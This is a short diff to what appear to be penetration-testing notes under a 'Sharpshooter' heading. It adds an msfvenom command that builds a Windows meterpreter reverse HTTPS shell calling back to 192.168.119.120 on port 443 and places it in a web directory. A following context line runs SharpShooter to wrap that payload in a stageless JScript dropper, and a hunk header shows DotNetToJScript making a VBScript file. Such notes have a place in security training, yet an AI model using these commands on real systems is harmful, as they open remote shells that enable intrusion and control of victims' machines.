@@ -30,6 +30,7 @@ DotNetToJScript.exe ExampleAssembly.dll --lang=vbscript --ver=v4 -o demo.vbs
 ## Sharpshooter
 
 ```
+sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f raw -o /var/www/html/shell.txt
 ┌──(kali㉿kali)-[/opt/SharpShooter]
 └─$ sudo python SharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile /var/www/html/shell.txt --output test
 
